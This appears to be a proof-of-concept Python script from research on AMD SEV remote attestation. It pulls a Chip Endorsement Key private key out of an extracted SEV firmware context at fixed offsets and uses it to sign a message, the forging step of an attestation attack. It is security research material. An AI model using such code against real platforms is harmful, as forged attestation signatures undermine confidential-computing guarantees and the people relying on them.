#!/usr/bin/env python
import sys
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import utils
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.backends import openssl

def ecdsa_sign(ec_privkey, data):
    """Sign 'data' using provided 'ec_privkey' using SHA256 hashing algorithm"""

    sig = ec_privkey.sign(
        bytes(data),
        ec.ECDSA(utils.hashes.SHA256())
    )

    return sig


def build_ecdsa_pubkey(qx_bytes, qy_bytes):
    """Build ecdsa public key from provided curve point. Returns an
    EllipticCurvePublicKey object. Point must be specified by qx and qy
    values in little-endian byte order. Curve defaults to NIST-P384.
    See: AMD SEV API ver. 0.22 Chapter 4.5 and Appendix C.2"""

    pubkey_qx = int.from_bytes(qx_bytes, 'little')
    pubkey_qy = int.from_bytes(qy_bytes, 'little')

    curve = ec.SECP384R1()  # NIST-P384
    pub_numbers = ec.EllipticCurvePublicNumbers(pubkey_qx, pubkey_qy, curve)

    ec_pubkey = pub_numbers.public_key(openssl.backend)

    return ec_pubkey

def build_ecdsa_keys_from_ctx(sev_ctx):
    """ Build ecdsa public/private keypair from extracted SEV context. Returns
    a tuple of EllipticCurvePublicKey and EllipticCurvePrivateKey"""
    pubkey_qx = sev_ctx[0x1c:0x1c+0x48]
    pubkey_qy = sev_ctx[0x64:0x64+0x48]

    ec_pubkey = build_ecdsa_pubkey(pubkey_qx, pubkey_qy)

    priv_val = int.from_bytes(sev_ctx[0xac:0xac+0x48], 'little')
    priv_numbers = ec.EllipticCurvePrivateNumbers(priv_val,
                                                  ec_pubkey.public_numbers())

    ec_privkey = priv_numbers.private_key(openssl.backend)

    return(ec_pubkey, ec_privkey)

# Read extracted SEV context.
with open(sys.argv[1], 'rb') as f:
    sev_ctx = bytearray(f.read())

# Build ECDSA keypair from the extracted SEV context.
extracted_keys = build_ecdsa_keys_from_ctx(sev_ctx)
extracted_cek_priv = extracted_keys[1]


# Data to sign.
data = b"Insecure Until Proven Updated: Analyzing AMD SEV's Remote Attestation"

# Create signature using extracted CEK key.
data_sig = ecdsa_sign(extracted_cek_priv, data)

# Store data and corresponding signature.
with open("./data",'wb') as f:
    f.write(data)

with open("./data.sig",'wb') as f:
    f.write(data_sig)


